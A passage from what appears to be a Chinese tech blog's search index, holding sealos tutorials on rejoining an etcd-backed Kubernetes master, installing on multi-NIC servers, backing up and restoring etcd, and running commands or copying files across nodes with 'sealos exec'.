","permalink":"https://www.fenghong.tech/blog/kubernetes/kubernetes-ingress-bug-1.18.8/","tags":["kubernetes","iptables","ipvs","kube-proxy"],"title":"记一次kubernetes v1.18.7 ingress访问异常问题及解决"},{"categories":["sealos"],"contents":"sealos 安装HA 3 master Kubernetes $ sealos init --master 192.168.0.118 \\ \t--master 192.168.0.119 \\ \t--master 192.168.0.25 \\ \t--pkg-url /root/kube1.18.7.tar.gz \\ \t--version v1.18.7 \\ \t--passwd centos --user root 背景  sealos init 3 台 master, 由于不可预知原因, 其中一台 192.168.0.119 断电宕机等不可避免因素. 重启后启动失败. 故考虑clean后, 再join到集群.\n 首先 clean该问题节点.\nsealos clean --master 192.168.0.119 -f 其次 join, join过程会出现 etcd 检查失败.\n$ sealos join --master 192.168.0.119 ... [check-etcd] Checking that the etcd cluster is healthy error execution phase check-etcd: etcd cluster is not healthy: failed to dial endpoint https://192.168.0.119:2379 with maintenance client: context deadline exceeded ... 解决方法  因为sealos 构建的高可用集群底层是通过 kubeadm 工具搭建的，且使用了 etcd 镜像方式与 master 节点一起，所以每个 Master 节点上都会存在一个 etcd 容器实例。当剔除一个 master 节点时 etcd 集群未删除剔除的节点的 etcd 成员信息，该信息还存在 etcd 集群列表中。\n // todo 优化: 这里是不是考虑clean的时候把 ectd 集群的member 也清理一下?\n所以，我们需要手动删除 etcd 成员信息。\n$ kubectl get pods -n kube-system | grep etcd etcd-server501 1/1 Running 3 21d etcd-ubuntu 1/1 Running 0 21d $ kubectl exec -n kube-system -it etcd-ubuntu -- sh # export ETCDCTL_API=3 # alias etcdctl=\u0026#39;etcdctl --endpoints=https://127.0.0.1:2379 --cacert=/etc/kubernetes/pki/etcd/ca.crt --cert=/etc/kubernetes/pki/etcd/server.crt --key=/etc/kubernetes/pki/etcd/server.key\u0026#39; # etcdctl member list 1bd1316c3c1a02a1, started, server501, https://192.168.0.25:2380, https://192.168.0.25:2379, false 2fe4b88491460ba0, started, server119, https://192.168.0.119:2380, https://192.168.0.119:2379, false 486e0511355102be, started, ubuntu, https://192.168.0.118:2380, https://192.168.0.118:2379, false # etcdctl member remove 2fe4b88491460ba0 然后执行clean \u0026amp;\u0026amp; join即可解决.\n$ sealos clean --master 192.168.0.119 -f $ sealos join --master 192.168.0.119 这里谢谢钉钉@毛徐飞提供相关环境.\n link to_  ","permalink":"https://www.fenghong.tech/blog/kubernetes/sealos-join-master/","tags":["etcd","sealos"],"title":"sealos join master 失败"},{"categories":["sealos"],"contents":"多网卡在sealos中的解决方案 情形一  有网络环境如下：每台服务器两张网卡，千兆网络直通互联网，名字ens33，默认路由走该网卡。 万兆网二层打通。网卡名字ens32。 如果配置了路由更好， 没有配置的话，也不影响。\n 假定环境如下： 192.168.160.1 为外网网卡路由 192.168.253.0/24 为内网网段.\n   主机名称 网卡1(ens33) 网卡2(ens32)     master1 192.168.160.243 192.168.253.129   master2 192.168.160.244 192.168.253.128   master3 192.168.160.245 192.168.253.130   node01 192.168.160.246 192.168.253.131    ip和路由情况， 其他类同。\n $ ip a |grep inet inet 127.0.0.1/8 scope host lo inet 192.168.253.129/24 brd 192.168.253.255 scope global noprefixroute dynamic ens32 inet 192.168.160.243/23 brd 192.168.161.255 scope global noprefixroute ens33 $ ip route show | grep default default via 192.168.160.1 dev ens33 希望使用万兆ens32内网部署kubernetes v1.19.2高可用集群。\n$ wget -c https://sealyun.oss-cn-beijing.aliyuncs.com/latest/sealos \u0026amp;\u0026amp; \\ chmod +x sealos \u0026amp;\u0026amp; mv sealos /usr/bin ## 离线资源包自行下载， 默认已经下载到`/root/`。 $ sealos init --master 192.168.253.128 \\ --master 192.168.253.129 \\ --master 192.168.253.130 \\ --node 192.168.253.131 \\ --pkg-url /root/kube1.19.2.tar.gz \\ --version v1.19.2 \\ --passwd centos \\ --interface ens32 | tee -a 1.19.2.new.log  参数名称解析\n    参数名 含义 示例     passwd 服务器密码 centos   master k8s master节点IP地址 192.168.253.128   node k8s node节点IP地址 192.168.253.131   pkg-url 离线资源包地址，支持下载到本地，或者一个远程地址 /root/kube1.19.2.tar.gz   version 资源包对应的版本 v1.19.2   interface calico使用的网卡名称或者路由 ens32    注意事项：\n 各节点时间同步. 各节点主机名不能重复. 双网卡需要指定interface. 不然部署后， calico启动不了， 后面情形二会详细说明. 服务器密码不一样，采用--pk /root/.ssh/id_rsa 密钥进行验证.   情形二  有网络环境如下：每台服务器两张网卡，千兆网络直通互联网，默认路由走该网卡。\n  万兆网二层打通。 每台服务器有由于前期规划原因， 各网卡名称不一样， 万兆内网环境有路由。\n 假定环境如下： 192.168.160.1 为外网网卡路由 192.168.253.1 为内网路由.\n   主机名称 网卡1(外网网卡) 网卡2(内网网卡)     master1 192.168.160.243 192.168.253.129   master2 192.168.160.244 192.168.253.128   master3 192.168.160.245 192.168.253.130   node01 192.168.160.246 192.168.253.131    希望使用万兆内网部署kubernetes v1.19.2高可用集群, 三层有路由192.168.253.1。\n$ wget -c https://sealyun.oss-cn-beijing.aliyuncs.com/latest/sealos \u0026amp;\u0026amp; \\ chmod +x sealos \u0026amp;\u0026amp; mv sealos /usr/bin ## 离线资源包自行下载， 默认已经下载到`/root/`。 $ sealos init --master 192.168.253.128 \\ --master 192.168.253.129 \\ --master 192.168.253.130 \\ --node 192.168.253.131 \\ --pkg-url /root/kube1.19.2.tar.gz \\ --version v1.19.2 \\ --passwd centos \\ --interface 192.158.253.1 | tee -a 1.19.2.new.log 这里--interface 使用路由的原理是IP_AUTODETECTION_METHOD IP_AUTODETECTION_METHOD=can-reach=DESTINATION。 目前这边使用的是网卡名称和ipv4， 来适配。 如果自行安装cni。 使用--without-cni 来避免安装cni。\nnode节点和master节点的api通信， 是sealos/lvscare， 基于内核ipvs， 类似kube-proxy的实现。 node 节点如果默认路由是192.168.160.1. 则10.103.97.2:6443 -\u0026gt; 192.168.253.129:6443 这个就必然不通。 因此 sealos这里 为用户添加了一条专门的路由 ip add r 10.103.97.2 via 192.168.253.131. 通过万兆网卡来进行寻路。解决通信问题 情形三\n网卡名称尽量统一， 如果做不到， 为万兆内网配一个网关吧. 用户自行解决\n用户有情况需要用到防火墙firewalld.\n","permalink":"https://www.fenghong.tech/blog/kubernetes/sealos-multi-iface-solution/","tags":["etcd","backup","exec"],"title":"sealos 多网卡安装解决方案"},{"categories":["sealos"],"contents":"sealos etcd 命令 使用sealos etcd save 备份落盘位置会在执行sealos的主机上. 同时, restore的时候, 也会恢复在执行sealos的主机上, sealos save 逻辑是调用 etcd clientv3 生成snapshot备份文件.\n$ sealos etcd save -h Flags: --aliId string aliyun accessKeyId to save snapshot --aliKey string aliyun accessKeySecrets to save snapshot --backupPath string Specify snapshot backup dir (default \u0026quot;/opt/sealos/ectd-backup\u0026quot;) --bucket string oss bucketName to save snapshot --docker snapshot your kubernets etcd in container, will add unix timestamp to snapshot name --ep string aliyun endpoints to save snapshot -h, --help help for save --name string Specify snapshot name (default \u0026quot;snapshot\u0026quot;) --objectPath string aliyun oss objectPath to save snapshot, like: /sealos/snapshots/ 说明一下选项\n --aliId: 阿里云的accessKeyId --aliKey: 阿里云的accessKeySecrets --backupPath: 在执行sealos的主机以及master主机上的备份路径. 默认为/opt/sealos/ectd-backup --bucket: 阿里云的oss bucketName --ep: 阿里云oss endpoint. 例如: oss-cn-hangzhou.aliyuncs.com --name: 备份文件的名字, 默认为snapshot --objectPath: 阿里云oss objectPath. 例如: /sealos/snapshots/  这里, 上传阿里云oss. 使用命令行或者编辑配置文件均可.\n$ sealos etcd save --docker \\ --aliId youraliyunkeyid \\ --aliKey youraliyunkeysecrets \\ --ep oss-cn-hangzhou.aliyuncs.com \\ --bucket etcdbackup \\ --objectPath /sealos/ 或者使用vim 编辑 .sealos/config.yaml 文件. 均可\n$ cat .sealos/config.yaml masters: - 192.168.0.31:22 nodes: - 192.168.0.30:22 - 192.168.0.88:22 - 192.168.0.65:22 dnsdomain: cluster.local apiservercertsans: - 127.0.0.1 - apiserver.cluster.local - 192.168.0.31 - 10.103.97.2 user: root passwd: \u0026quot;\u0026quot; privatekey: /root/.ssh/id_rsa pkpassword: \u0026quot;\u0026quot; apiserverdomian: apiserver.cluster.local vip: 10.103.97.2 pkgurl: /root/kube1.18.0.tar.gz version: v1.18.0 repo: k8s.gcr.io podcidr: 100.64.0.0/10 svccidr: 10.96.0.0/12 certpath: /root/.sealos/pki certetcdpath: /root/.sealos/pki/etcd lvscarename: fanux/lvscare lvscaretag: latest alioss: ossendpoint: oss-cn-hangzhou.aliyuncs.com accesskeyid: ***** accesskeysecrets: **** bucketname: etcdbackup objectpath: /sealos/ 在kubernetes 使用cronjob备份 依赖 ~/.sealos/config.yaml 依赖 etcd cacert，cert， key， 目前读取的文件是 ~/.sealos/pki/etcd/的证书。\n首先. 只需要挂载~/.sealos/到容器~/.sealos/. 挂载这个目录的目的是， 使用其中四个文件. 给四个文件创建secret感觉有点臃肿. 故而采用目录挂载. 我们假设master-01是您执行sealos init的主机.\n 如果在集群外执行init. 请使用scp. 例如scp -rf ~/.sealos master-01:/root/.\n $ kubectl label nodes master-01 name=sealos --overwrite 如果你通过ssh连接到各master的方式如果为秘钥验证, 则需要添加一个secret保存秘钥即可. 为了安全，我这边使用在kube-system中创建的。\n$ kubectl create secret generic pk-sealos --from-file=/root/.ssh/id_rsa -n kube-system 我们编辑crontjob.yaml\napiVersion: batch/v1beta1 kind: CronJob metadata: name: backup-etcd namespace: kube-system ## you can change to any namespace spec: #当没有指定pod选择器时它将根据pod模板中的标签创建 schedule: \u0026quot;0 21 * * *\u0026quot; # backup everyday on 21：00 successfulJobsHistoryLimit: 3 jobTemplate: #创建新pod所使用的pod模板 spec: template: # 此CronJob创建Job资源会用到的模板 spec: restartPolicy: OnFailure # Job不能使用Always作为默认的重新启动策略 nodeSelector: name: sealos ## this is your sealos init machine. so we can use hostPath. volumes: - hostPath: path: /root/.sealos type: DirectoryOrCreate name: sealos-home # if use password to auth, just remove this secret # before use secret, you must create it. - secret: defaultMode: 420 items: - key: id_rsa path: id_rsa secretName: pk-sealos name: pk-sealos containers: - name: sealos image: louisehong/sealos:3.3.10 args: - etcd - save - --docker volumeMounts: - mountPath: /root/.sealos name: sealos-home # if use password to auth, just remove this volumeMounts - mountPath: /root/.ssh/id_rsa name: pk-sealos subPath: id_rsa 然后执行apply即可.\n$ kubectl apply -f crontjob.yaml $ kubectl get cronjobs.batch -n kube-system NAME SCHEDULE SUSPEND ACTIVE LAST SCHEDULE AGE backup-etcd 0 21 * * * False 0 20h 9d 备份后, 可以查看具体的日志.\n$ $ kubectl get pods -n kube-system| grep backup backup-etcd-1598662800-69sbh 0/1 Completed 0 2d8h backup-etcd-1598706000-vwhpz 0/1 Completed 0 44h backup-etcd-1598792400-m5z5z 0/1 Completed 0 20h $ kubectl logs -f backup-etcd-1598792400-m5z5z -n kube-system ... 13:00:12 [INFO] [etcd_save.go:120] Finished saving/uploading snapshot [snapshot-1598792407] on aliyun oss [etcdbackup] bucket 13:00:12 [INFO] [etcd.go:111] Finished saving/uploading snapshot [snapshot-1598792407] 13:00:12 [INFO] [etcd_save.go:259] health check for etcd: [{192.168.0.31:2379 true 18.571896ms }] 使用sealos etcd health 很简单的调用etcd clientv3的sdk. 执行健康检查. 每次 save 也会进行健康检查.\n$ sealos etcd health 17:14:06 [INFO] [etcd_save.go:255] health check for etcd: [{192.168.0.31:2379 true 10.493436ms }] 使用sealos etcd restore restore的逻辑是(如果有高手有好的恢复逻辑, 请单独联系我):\n 手动交互确认. 如果使用了-f 或者 --force 则跳过确认. 通过save下来的文件, 进行restore操作. 会在执行sealos etcd restore的主机下生成目录restorePath + hostname. 停止 kubernetes kube-apiserver kube-controller-manager kube-scheduler etcd . 并备份/var/lib/etcd/ 将2生成的备份目录打包成tar包, 复制到各etcd节点(一般是master节点). 然后在各节点分别解压到/var/lib/etcd. 启动kubernetes kube-apiserver kube-controller-manager kube-scheduler etcd 最后做一次健康检查(60s). 如果其中有错误发生. 则恢复3步骤的备份.  $ sealos etcd restore -h Restores an etcd member snapshot to an etcd directory Usage: sealos etcd restore [flags] Flags: --backupPath string Specify snapshot backup dir (default \u0026quot;/opt/sealos/ectd-backup\u0026quot;) -f, --force restore need interactive to confirm -h, --help help for restore --name string Specify snapshot name (default \u0026quot;snapshot\u0026quot;) --restorePath string Specify snapshot restore dir (default \u0026quot;/opt/sealos/ectd-restore\u0026quot;) Global Flags: --config string config file (default is $HOME/.sealos/config.yaml) 与sealos save 相反的操作. 但是此操作比较危险. 所以添加了交互确认.\n选项说明\n  --backupPath: 存储备份的文件夹. 默认和save下来的一致, /opt/sealos/ectd-backup\n  --restorePath: 恢复文件夹. 默认/opt/sealos/ectd-restore. 配合主机名. 避免多master导致恢复文件夹重复.\n  -f, --force: 交互式确认是否要执行restore.\n  --name: 备份的文件名字. 默认和save下来的一致. snapshot\n  单机测试restore恢复 如下:\n[root@dev-k8s-master ~]# ./sealos etcd restore restore cmd will stop your kubernetes cluster immediately and restore etcd from your backup snapshot file (y/n)?y 17:34:17 [INFO] [ssh.go:12] [ssh][192.168.160.243] hostname 17:34:17 [DEBG] [ssh.go:24] [ssh][192.168.160.243]command result is: dev-k8s-master 17:34:17 [INFO] [ssh.go:105] [ssh][192.168.160.243] cd /tmp \u0026amp;\u0026amp; rm -rf /opt/sealos/ectd-restore-dev-k8s-master 17:34:17 [INFO] [ssh.go:12] [ssh][192.168.160.243] hostname 17:34:18 [DEBG] [ssh.go:24] [ssh][192.168.160.243]command result is: dev-k8s-master {\u0026quot;level\u0026quot;:\u0026quot;info\u0026quot;,\u0026quot;ts\u0026quot;:1598866458.160008,\u0026quot;caller\u0026quot;:\u0026quot;snapshot/v3_snapshot.go:296\u0026quot;,\u0026quot;msg\u0026quot;:\u0026quot;restoring snapshot\u0026quot;,\u0026quot;path\u0026quot;:\u0026quot;/opt/sealos/ectd-backup/snapshot\u0026quot;,\u0026quot;wal-dir\u0026quot;:\u0026quot;/opt/sealos/ectd-restore-dev-k8s-master/member/wal\u0026quot;,\u0026quot;data-dir\u0026quot;:\u0026quot;/opt/sealos/ectd-restore-dev-k8s-master\u0026quot;,\u0026quot;snap-dir\u0026quot;:\u0026quot;/opt/sealos/ectd-restore-dev-k8s-master/member/snap\u0026quot;} {\u0026quot;level\u0026quot;:\u0026quot;info\u0026quot;,\u0026quot;ts\u0026quot;:1598866458.1982617,\u0026quot;caller\u0026quot;:\u0026quot;mvcc/kvstore.go:380\u0026quot;,\u0026quot;msg\u0026quot;:\u0026quot;restored last compact revision\u0026quot;,\u0026quot;meta-bucket-name\u0026quot;:\u0026quot;meta\u0026quot;,\u0026quot;meta-bucket-name-key\u0026quot;:\u0026quot;finishedCompactRev\u0026quot;,\u0026quot;restored-compact-revision\u0026quot;:970469} {\u0026quot;level\u0026quot;:\u0026quot;info\u0026quot;,\u0026quot;ts\u0026quot;:1598866458.2281547,\u0026quot;caller\u0026quot;:\u0026quot;membership/cluster.go:392\u0026quot;,\u0026quot;msg\u0026quot;:\u0026quot;added member\u0026quot;,\u0026quot;cluster-id\u0026quot;:\u0026quot;d12074ddc55c9483\u0026quot;,\u0026quot;local-member-id\u0026quot;:\u0026quot;0\u0026quot;,\u0026quot;added-peer-id\u0026quot;:\u0026quot;5dfe17d3cf203a7e\u0026quot;,\u0026quot;added-peer-peer-urls\u0026quot;:[\u0026quot;https://192.168.160.243:2380\u0026quot;]} {\u0026quot;level\u0026quot;:\u0026quot;info\u0026quot;,\u0026quot;ts\u0026quot;:1598866458.235216,\u0026quot;caller\u0026quot;:\u0026quot;snapshot/v3_snapshot.go:309\u0026quot;,\u0026quot;msg\u0026quot;:\u0026quot;restored snapshot\u0026quot;,\u0026quot;path\u0026quot;:\u0026quot;/opt/sealos/ectd-backup/snapshot\u0026quot;,\u0026quot;wal-dir\u0026quot;:\u0026quot;/opt/sealos/ectd-restore-dev-k8s-master/member/wal\u0026quot;,\u0026quot;data-dir\u0026quot;:\u0026quot;/opt/sealos/ectd-restore-dev-k8s-master\u0026quot;,\u0026quot;snap-dir\u0026quot;:\u0026quot;/opt/sealos/ectd-restore-dev-k8s-master/member/snap\u0026quot;} 17:34:28 [INFO] [ssh.go:105] [ssh][192.168.160.243] cd /tmp \u0026amp;\u0026amp; mv /etc/kubernetes/manifests /etc/kubernetes/manifestslezSCljV 17:34:28 [INFO] [ssh.go:105] [ssh][192.168.160.243] cd /tmp \u0026amp;\u0026amp; mv /var/lib/etcd /var/lib/etcdlezSCljV 17:34:38 [INFO] [etcd.go:136] send restore file to etcd master node and start etcd 17:34:38 [INFO] [ssh.go:12] [ssh][192.168.160.243] hostname 17:34:38 [DEBG] [ssh.go:24] [ssh][192.168.160.243]command result is: dev-k8s-master 17:34:39 [INFO] [etcd_restore.go:140] compress file 17:34:39 [INFO] [ssh.go:57] [ssh][192.168.160.243] mkdir -p /var/lib || true 17:34:39 [DEBG] [download.go:29] [192.168.160.243]please wait for mkDstDir 17:34:39 [INFO] [ssh.go:12] [ssh][192.168.160.243] ls -l /var/lib/ectd-restore-dev-k8s-master.tar 2\u0026gt;/dev/null |wc -l 17:34:39 [DEBG] [ssh.go:24] [ssh][192.168.160.243]command result is: 0 17:34:39 [DEBG] [scp.go:24] [ssh]source file md5 value is bc76f9bb1aea210fb815a43aed27aa29 17:34:40 [ALRT] [scp.go:98] [ssh][192.168.160.243]transfer total size is: 1244.01KB ;speed is 1MB 17:34:40 [INFO] [ssh.go:12] [ssh][192.168.160.243] md5sum /var/lib/ectd-restore-dev-k8s-master.tar | cut -d\u0026quot; \u0026quot; -f1 17:34:40 [DEBG] [ssh.go:24] [ssh][192.168.160.243]command result is: bc76f9bb1aea210fb815a43aed27aa29 17:34:40 [DEBG] [scp.go:27] [ssh]host: 192.168.160.243 , remote md5: bc76f9bb1aea210fb815a43aed27aa29 17:34:40 [INFO] [scp.go:31] [ssh]md5 validate true 17:34:40 [INFO] [download.go:38] [192.168.160.243]copy file md5 validate success 17:34:40 [DEBG] [download.go:44] [192.168.160.243]please wait for after hook 17:34:40 [INFO] [ssh.go:57] [ssh][192.168.160.243] tar xf /var/lib/ectd-restore-dev-k8s-master.tar -C /var/lib/ \u0026amp;\u0026amp; mv /var/lib/ectd-restore-dev-k8s-master /var/lib/etcd \u0026amp;\u0026amp; rm -rf /var/lib/ectd-restore-dev-k8s-master.tar 17:34:41 [INFO] [etcd.go:145] Start kube-apiserver kube-controller-manager kube-scheduler 17:34:41 [INFO] [ssh.go:105] [ssh][192.168.160.243] cd /tmp \u0026amp;\u0026amp; mv /etc/kubernetes/manifestslezSCljV /etc/kubernetes/manifests 17:34:41 [INFO] [etcd.go:148] Wait 60s to health check for etcd 17:35:41 [INFO] [etcd_save.go:259] health check for etcd: [{192.168.160.243:2379 true 6.206351ms }] 17:35:41 [INFO] [etcd.go:151] restore kubernetes yourself glad~ sealos exec 命令  支持在指定节点执行自定义命令, 拷贝一个文件到一些指定节点\n 如在所有master节点创建一个目录\nsealos exec --cmd \u0026quot;mkdir /data\u0026quot; --label node-role.kubernetes.io/master=\u0026quot;\u0026quot; sealos exec --cmd \u0026quot;mkdir /data\u0026quot; --node x.x.x.x sealos exec --cmd \u0026quot;mkdir /data\u0026quot; --node dev-k8s-mater 拷贝一个文件到一些指定节点\nsealos exec --src /data/foo --dst /root/foo --label node-role.kubernetes.io/master=\u0026quot;\u0026quot; sealos exec --src /data/foo --dst /root/foo --node x.x.x.x sealos exec --src /data/foo --dst /root/foo --node dev-k8s-mater 实现方法 获取待执行的ip序列逻辑 将 --label , --node hostname 所关联的对象全部转为ip, 以ip为基点去执行copy或者是cmd.\n使用ListOptions, 通过labelSelector直接定位到相关的nodeList节点. 如果label为空, 则返回空. 如果不为空, 则返回的ip 加入到待执行的ip序列.\nfunc GetNodeListByLabel(k8sClient *kubernetes.Clientset, label string) (*v1.NodeList, error) { listOption := \u0026amp;metav1.ListOptions{LabelSelector: label} return k8sClient.CoreV1().Nodes().List(context.TODO(), *listOption) } func GetNodeIpByLabel(k8sClient *kubernetes.Clientset, label string) ([]string, error) { var ips []string if label == \u0026quot;\u0026quot; { return ips, nil } nodes, err := GetNodeListByLabel(k8sClient, label) if err != nil { return nil, err } for _, node := range nodes.Items { for _, v := range node.Status.Addresses { if v.Type == v1.NodeInternalIP { ips = append(ips, v.Address) } } } if len(ips) != 0 { return ips, nil } return nil, fmt.Errorf(\u0026quot;label %s is not fount in kubernetes nodes\u0026quot;, label) } 将 --node 进行区分, 如果是ip ,则加入执行ip序列, 如果是hostname, 则加入到hostname序列, 通过使用Get方法, 获取K8s的ClientSet资源对象.通过nodename直接找到定位到node节点. 在通过一次for loop 找到hostname对应的ip, 将得到的ip加入到待执行的ip序列.\nnode, err := k8sClient.CoreV1().Nodes().Get(context.TODO(), nodeName, metav1.GetOptions{}) for _, node := range resHost { ip, err := GetNodeIpByName(k8sClient, node) if err == nil { ips = append(ips, ip) } } 这里对ips没有进行过滤. 只要满足是ipv4, 即加入到执行序列, 没有对master ips及nodes ips进行比对.\n// 集群 k8s-master 192.168.0.31 huohua-test 192.168.0.30 server65 192.168.0.65 server88-new 192.168.0.88 // sealos exec --cmd \u0026quot;hostname\u0026quot; --node 192.168.0.21 // 192.168.0.21 is not in your kubernetes. but if your ssh access 192.168.0.21. the command will be exec in 192.168.0.21. 执行命令逻辑 判断是执行copy 或者是 cmd方法如下. 如果两者都存在, 则先执行copy逻辑, 再执行cmd逻辑.\ntype ExecFlag struct { Dst string Src string Cmd string Label string ExecNode []string SealConfig } func (e *ExecFlag) IsUseCopy() bool { return FileExist(e.Src) \u0026amp;\u0026amp; e.Dst != \u0026quot;\u0026quot; } func (e *ExecFlag) IsUseCmd() bool { return e.Cmd != \u0026quot;\u0026quot; } 远程命令和复制实现 实现scp复制, 则是通过复制单个文件, 然后递归复制即可. 查看具体的源码 如果--dst在目标机器存在, 则不执行copy动作, 直接就跳过了.\n// todo 这里是否需要添加一个flag, 比如--force, -f, 直接覆盖? 或者先删除再复制?\n// CopyLocalToRemote is copy file or dir to remotePath func (ss *SSH) CopyLocalToRemote(host, localPath, remotePath string) { } // ssh session is a problem, 复用ssh链接 func (ss *SSH) copyLocalDirToRemote(sftpClient *sftp.Client, localPath, remotePath string) { } // solve the session func (ss *SSH) copyLocalFileToRemote(sftpClient *sftp.Client, localPath, remotePath string) { } 实现执行命令的逻辑. 这里是用的ssh. 具体不赘述.\n使用方法 $ ./sealos exec -h support exec cmd or copy file by Label/nodes Usage: sealos exec [flags] Examples: # exec cmd by label or nodes. when --label and --node is Exist, get Union of both. sealos exec --cmd \u0026quot;mkdir /data\u0026quot; --label node-role.kubernetes.io/master= --node 192.168.0.2 sealos exec --cmd \u0026quot;mkdir /data\u0026quot; --node 192.168.0.2 --nodes dev-k8s-mater # exec copy src file to dst by label or nodes. when --label and --node is Exist, get Union of both. sealos exec --src /data/foo --dst /root/foo --label node-role.kubernetes.io/master=\u0026quot;\u0026quot; sealos exec --src /data/foo --dst /root/foo --node 192.168.0.2 Flags: --cmd string exec command string --dst string dest file location -h, --help help for exec --label string kubernetes labels like node-role.kubernetes.io/master= --node strings node ip or hostname in kubernetes --src string source file location Global Flags: --config string config file (default is $HOME/.sealos/config.yaml) 选项说明:\n --cmd: 执行的命令. --src: 本地文件路径, 可以使文件或者是文件夹, 配合--dst使用. --dst: 目标文件路径, 配合--src使用. --label: kubernetes集群的label. 支持label逻辑表达式, 如 kubernetes.io/arch!=amd64 --node: 节点的ip或者是hostname  测试相关 集群如下\n$ kubectl get nodes --show-labels NAME STATUS ROLES AGE VERSION LABELS huohua-test Ready \u0026lt;none\u0026gt; 93d v1.18.3 beta.kubernetes.io/arch=amd64,beta.kubernetes.io/os=linux,kubernetes.io/arch=amd64,kubernetes.io/hostname=huohua-test,kubernetes.io/os=linux,name=huohua k8s-master Ready master 93d v1.18.3 beta.kubernetes.io/arch=amd64,beta.kubernetes.io/os=linux,kubernetes.io/arch=amd64,kubernetes.io/hostname=k8s-master,kubernetes.io/os=linux,node-role.kubernetes.io/master= server65 Ready \u0026lt;none\u0026gt; 89d v1.18.3 beta.kubernetes.io/arch=amd64,beta.kubernetes.io/os=linux,kubernetes.io/arch=amd64,kubernetes.io/hostname=server65,kubernetes.io/os=linux server88-new Ready \u0026lt;none\u0026gt; 90d v1.18.3 beta.kubernetes.io/arch=amd64,beta.kubernetes.io/os=linux,kubernetes.io/arch=amd64,kubernetes.io/hostname=server88-new,kubernetes.io/os=linux,name=front 仅使用 --label 执行 cmd 命令 Use \u0026ndash;label to exec cmd\n$ ./sealos exec --cmd \u0026quot;hostname \u0026quot; --label beta.kubernetes.io/arch=amd64 19:09:35 [INFO] [ssh.go:57] [ssh][192.168.0.88] cd /tmp \u0026amp;\u0026amp; hostname 19:09:35 [INFO] [ssh.go:57] [ssh][192.168.0.31] cd /tmp \u0026amp;\u0026amp; hostname 19:09:35 [INFO] [ssh.go:57] [ssh][192.168.0.30] cd /tmp \u0026amp;\u0026amp; hostname 19:09:35 [INFO] [ssh.go:57] [ssh][192.168.0.65] cd /tmp \u0026amp;\u0026amp; hostname 19:09:35 [INFO] [ssh.go:50] [192.168.0.88] server88-new 19:09:35 [INFO] [ssh.go:50] [192.168.0.30] huohua-test 19:09:35 [INFO] [ssh.go:50] [192.168.0.65] server65 19:09:36 [INFO] [ssh.go:50] [192.168.0.31] k8s-master 仅使用 --node 执行 cmd 命令 Use \u0026ndash;node to exec cmd\n$ ./sealos exec --cmd \u0026quot;hostname -i\u0026quot; --node huohua-test --node 192.168.0.65 19:20:47 [INFO] [ssh.go:57] [ssh][192.168.0.30] cd /tmp \u0026amp;\u0026amp; hostname -i 19:20:47 [INFO] [ssh.go:57] [ssh][192.168.0.65] cd /tmp \u0026amp;\u0026amp; hostname -i 19:20:47 [INFO] [ssh.go:50] [192.168.0.30] 192.168.0.30 19:20:47 [INFO] [ssh.go:50] [192.168.0.65] 192.168.0.65 使用 --label 和 --node执行 cmd 命令 Use --node --label  to exec cmd\n$ ./sealos exec --cmd \u0026quot;hostname -i\u0026quot; --node huohua-test --label node-role.kubernetes.io/master= 19:21:44 [INFO] [ssh.go:57] [ssh][192.168.0.30] cd /tmp \u0026amp;\u0026amp; hostname -i 19:21:44 [INFO] [ssh.go:57] [ssh][192.168.0.31] cd /tmp \u0026amp;\u0026amp; hostname -i 19:21:44 [INFO] [ssh.go:50] [192.168.0.30] 192.168.0.30 19:21:45 [INFO] [ssh.go:50] [192.168.0.31] 192.168.0.31 使用 --label 和 --node执行 cmd 命令和 复制文件 Use \u0026ndash;node \u0026amp; \u0026ndash;label to exec cmd \u0026amp; copy files\n$ ./sealos exec --cmd \u0026quot;ls -lh /data/01.txt\u0026quot; --src /root/01.txt --dst /data/01.txt --node huohua-test --label node-role.kubernetes.io/master= 19:23:01 [INFO] [ssh.go:12] [ssh][192.168.0.30] ls -l /data/01.txt 2\u0026gt;/dev/null |wc -l 19:23:01 [INFO] [ssh.go:12] [ssh][192.168.0.31] ls -l /data/01.txt 2\u0026gt;/dev/null |wc -l 19:23:01 [DEBG] [ssh.go:24] [ssh][192.168.0.30]command result is: 0 19:23:02 [INFO] [scp.go:328] [ssh]transfer [/root/01.txt] total size is: 2.11MB ;speed is 2MB 19:23:02 [DEBG] [ssh.go:24] [ssh][192.168.0.31]command result is: 0 19:23:02 [INFO] [scp.go:328] [ssh]transfer [/root/01.txt] total size is: 2.11MB ;speed is 2MB 19:23:02 [INFO] [ssh.go:57] [ssh][192.168.0.30] cd /tmp \u0026amp;\u0026amp; ls -lh /data/01.txt 19:23:02 [INFO] [ssh.go:57] [ssh][192.168.0.31] cd /tmp \u0026amp;\u0026amp; ls -lh /data/01.txt 19:23:02 [INFO] [ssh.go:50] [192.168.0.30] -rw-r--r-- 1 root root 2.2M 9月 4 19:23 /data/01.txt 19:23:03 [INFO] [ssh.go:50] [192.168.0.31] -rw-r--r--. 1 root root 2.2M Sep 4 19:23 /data/01.txt 使用 --label 和 --node执行 cmd 命令和 复制文件夹 Use \u0026ndash;node \u0026amp; \u0026ndash;label to exec cmd \u0026amp; copy dir\n$ ./sealos exec --cmd \u0026quot;ls -lh /data/test\u0026quot; --src /root/test --dst /data/test --node huohua-test --label node-role.kubernetes.io/master= 19:24:24 [INFO] [ssh.go:12] [ssh][192.168.0.30] ls -l /data/test 2\u0026gt;/dev/null |wc -l 19:24:24 [INFO] [ssh.go:12] [ssh][192.168.0.31] ls -l /data/test 2\u0026gt;/dev/null |wc -l 19:24:24 [DEBG] [ssh.go:24] [ssh][192.168.0.30]command result is: 0 19:24:24 [INFO] [scp.go:328] [ssh]transfer [/root/test/crontab.yaml] total size is: 1.19KB ;speed is 1KB 19:24:24 [INFO] [scp.go:328] [ssh]transfer [/root/test/crontab.yaml.bak] total size is: 2.23KB ;speed is 2KB 19:24:24 [DEBG] [ssh.go:24] [ssh][192.168.0.31]command result is: 0 19:24:25 [INFO] [scp.go:328] [ssh]transfer [/root/test/crontab.yaml] total size is: 1.19KB ;speed is 1KB 19:24:25 [INFO] [scp.go:328] [ssh]transfer [/root/test/crontab.yaml.bak] total size is: 2.23KB ;speed is 2KB 19:24:25 [INFO] [ssh.go:57] [ssh][192.168.0.30] cd /tmp \u0026amp;\u0026amp; ls -lh /data/test 19:24:25 [INFO] [ssh.go:57] [ssh][192.168.0.31] cd /tmp \u0026amp;\u0026amp; ls -lh /data/test 19:24:25 [INFO] [ssh.go:50] [192.168.0.30] 总用量 8.0K 19:24:25 [INFO] [ssh.go:50] [192.168.0.30] -rw-r--r-- 1 root root 1.2K 9月 4 19:24 crontab.yaml 19:24:25 [INFO] [ssh.go:50] [192.168.0.31] total 8.0K 使用 --label时, label 不存在 